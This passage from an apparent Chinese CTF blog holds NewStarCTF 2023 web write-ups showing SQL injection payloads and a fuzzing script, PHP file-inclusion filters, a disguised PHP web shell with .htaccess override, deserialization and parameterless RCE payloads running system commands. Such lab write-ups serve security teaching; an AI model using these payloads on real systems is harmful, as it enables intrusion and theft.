class="hljs-comment">//创建了一个新的XMLHttpRequest对象。XMLHttpRequest对象是用于在后台与服务器交换数据的JavaScript API。它可以通过HTTP或HTTPS协议发送HTTP请求，并接收服务器的响应。</span><br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-comment">//使用post请求打开一个api.php文件，并形成网页对象存储到xhr中</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//xhr网页建立一个网页请求头Content-Type，内容为application/json</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-comment">//创建一个json数据对象</span><br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-comment">//score是键，gameScore是value</span><br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        <span class="hljs-comment">//将json数据传输给xhr网页对象</span><br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>根据代码审计我们需要传输一个json数据给网页，这个json数据就是我们游戏的分数，使用bp抓包，在api.php所在网页传输一个json数据:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type:application/json<br><br>&#123;<br>   &quot;score&quot;:100000000000<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004154912262.png" alt="image-20231004154912262"></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004155124328.png" alt="image-20231004155124328"></p><p>我们在url中发现存在sql注入点:<br><img src="/images/2023-10-9-Newstar-2/image-20231004155156692.png" alt="image-20231004155156692"></p><p>猜测可能是通过id在数据库中寻找存在的记录然后回显到页面:<br>测试该网页是否存在sql报错:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004155327273.png" alt="image-20231004155327273"></p><p>发现网页不会回显报错信息，但是会回显数据库中搜索到，并返回的结果集，所以我们可以试试一下union注入法:</p><p>第一步：由于union注入需要确切知道select返回的字段数，所以需要先爆数据库的字段:</p><p>payload(order by,group by,union select 1,2,3,….):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160721249.png" alt="image-20231004160721249"></p><p>发现有过滤,使用脚本扫一下有哪些关键词过滤:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://64a5def2-4e23-45a6-a6e6-22ec898fc9f2.node4.buuoj.cn:81/?id=&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    da = data<br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(data)</span><br>    <span class="hljs-comment"># da = &quot;1&#123;&#125;&quot;.format(data)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data)<br>    r = requests.get(url+da)<br>    <span class="hljs-comment"># 使用time使请求能够拥有足够的时间去响应</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># 获取过滤网站响应信息</span><br>    reponse_txt = <span class="hljs-string">&quot;no!&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     # da = d</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(d)</span><br><span class="hljs-comment">#     da = d</span><br><span class="hljs-comment">#     # POST传输json数据</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;query&quot;:da</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     reponse_txt = &quot;Nonono&quot;</span><br><span class="hljs-comment">#     # print(r.text)</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(d)</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(d))</span><br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004162813880.png" alt="image-20231004162813880"></p><p>我们先尝试使用大小写绕过法:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160824030.png" alt="image-20231004160824030"></p><p>发现绕过！！！</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,2,3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160937013.png" alt="image-20231004160937013"></p><p>发现回显内容，所以可以确定select返回结果集的字段个数为5</p><p>第二步：爆数据库</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,database(),3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004163106775.png" alt="image-20231004163106775"></p><p>得到数据库:ctf</p><p>第三步：爆表:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">常规:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables Where table_schema= DATABASE(); -- &#x27;<br>暴力方式:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables -- &#x27;<br></code></pre></td></tr></table></figure><p>常规:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164025606.png" alt="image-20231004164025606"></p><p>暴力:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164224393.png" alt="image-20231004164224393"></p><p>最终我们发现一个关键的表:here_is_flag</p><p>第四步：爆表的字段:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,Group_concat(column_name),3,4,5 from infOrmation_schema.COLUMNS Where table_schema = &#x27;ctf&#x27; And table_name = &#x27;here_is_flag&#x27;; -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170217827.png" alt="image-20231004170217827"></p><p>得到字段flag</p><p>第五步：爆字段的值:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1&#x27;union Select 1,Group_concat(flag),3,4,5 from here_is_flag -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170857984.png" alt="image-20231004170857984"></p><p>获得flag</p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-comment">//这里过滤了base编码和rot编码获取文件包含信息</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-comment">//存在文件包含漏洞</span><br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br></code></pre></td></tr></table></figure><p>提供文件包含漏洞的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>php://filter/read=convert.url-encode/resource=flag.php<br>php://filter/read=convert.base64-decode/resource=flag.php<br>php://filter/read=convert.base64url-decode/resource=flag.php<br>php://filter/read=convert.rot13/resource=flag.php<br>php://filter/read=convert.hex/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br>php://filter/read=convert.quoted-printable-decode/resource=flag.php<br>php://filter/read=convert.base64url-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004171344082.png" alt="image-20231004171344082"></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004171830952.png" alt="image-20231004171830952"></p><p>这是一道文件上传题，我们先上传一个php文件并抓包一下:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172115084.png" alt="image-20231004172115084"></p><p>发现bp没有响应，前端直接返回判断信息，要使bp能够抓取信息，可以在浏览器中关闭前端js</p><p>这里偷懒直接上传了用js写的php文件的图片形式:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">GIF89</span>a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;pass&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172603995.png" alt="image-20231004172603995"></p><p>发现成功上传！！！</p><p>由于无法抓包，我们需要再上传.htaccess文件对同一个文件夹下的指定图片文件进行解析:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;FilesMatch &quot;showfiles3.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172835389.png" alt="image-20231004172835389"></p><p>发现成功上传到同一目录下</p><p>访问木马图片:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172930848.png" alt="image-20231004172930848"></p><p>成功！！！</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173020270.png" alt="image-20231004173020270"></p><p>发现flag文件:this_is_flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;cat /this_is_flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173154948.png" alt="image-20231004173154948"></p><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//私有变量$cmd</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">//反序列化会自动调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//过滤常规的文件打开命令</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//进行系统命令执行</span><br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//反序列化传入的变量值</span><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>构造反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//私有变量只能直接赋值</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">// @system($this-&gt;cmd);</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// @unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj1</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj1</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>这里发现url编码的内容无法被执行，所以采用源码<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:4:&quot;ls /&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175532104.png" alt="image-20231004175532104"></p><p>发现文件:th1s_1s_fffflllll4444aaaggggg</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175916496.png" alt="image-20231004175916496"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004212050514.png" alt="image-20231004212050514"></p><p>有题目的英文提示得，该网页存在文件泄露,先尝试.git泄露：</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004212637348.png" alt="image-20231004212637348"></p><p>发现存在bo0g1pop.php</p><p>对bo0g1pop.php进行代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//正则匹配funname(funname1()funname2())形式的字符串，即我们不能传参数在函数中</span><br><span class="hljs-comment">//\((?R)?\):表示将()作为递归的模板进行递归匹配字符串，递归一般从最里面进行匹配</span><br><span class="hljs-comment">//无参RCE</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//对一些函数进行过滤</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<span class="hljs-comment">//存在危险代码执行漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里使用无参RCE的函数:getallheaders()</p><p>这个函数的作用是获取http请求头中的信息，并以关联数组的形式返回:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">先观察该网页http请求头的第一个健是谁:<br>?star=print(getallheaders());<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232607329.png" alt="image-20231004232607329"></p><p>由于直接输出数组头元素为Array,所以我们需要用next()函数使数组定位到第二个元素输出：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232730086.png" alt="image-20231004232730086"></p><p>发现输出了请求头User-Agent的值，即第二个请求头的值</p><p>我们伪造一下第二个请求头User-Agent的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:666<br><br>?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234434183.png" alt="image-20231004234434183"></p><p>发现成功被执行</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;ls /&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234547770.png" alt="image-20231004234547770"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;head /flag&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234627391.png" alt="image-20231004234627391"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_第一周WP</title>
    <link href="/2023/10/04/2023-10-4-Newstar_1/"/>
    <url>/2023/10/04/2023-10-4-Newstar_1/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-第一周WP"><a href="#NewStarCTF-2023-第一周WP" class="headerlink" title="NewStarCTF 2023_第一周WP"></a>NewStarCTF 2023_第一周WP</h1><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133137466.png" alt="image-20230926133137466"></p><p>根据网页显示的内容，我们需要提供它一个number1和number2的值，没有告诉我们具体的请求方式，我们先用get请求先传输一个number1值试试:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?number1=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133446856.png" alt="image-20230926133446856"></p><p>发生报错，在报错信息中寻找一下有没有flag：<br><img src="/images/2023-10-4-Newstar-1/image-20230926133538322.png" alt="image-20230926133538322"></p><p>发现flag,这里应该是没有num2的值所以num2为空就报错显示了</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133854855.png" alt="image-20230926133854855"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?ctf=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133932034.png" alt="image-20230926133932034"></p><p>更具提示我们需要寻找secret的值，并用post传参，网页显示上没有secret,那么在网页源码中找一下:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926134135307.png" alt="image-20230926134135307"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)<br>=&gt;<br>Secret: n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?ctf=1<br>POST:<br>secret=n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134415967.png" alt="image-20230926134415967"></p><p>这里回显是认证信息，一般都是用cookie进行身份认证的，所以使用BP抓包:<br><img src="/images/2023-10-4-Newstar-1/image-20230926134605035.png" alt="image-20230926134605035"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:power=ctfer<br></code></pre></td></tr></table></figure><p><img 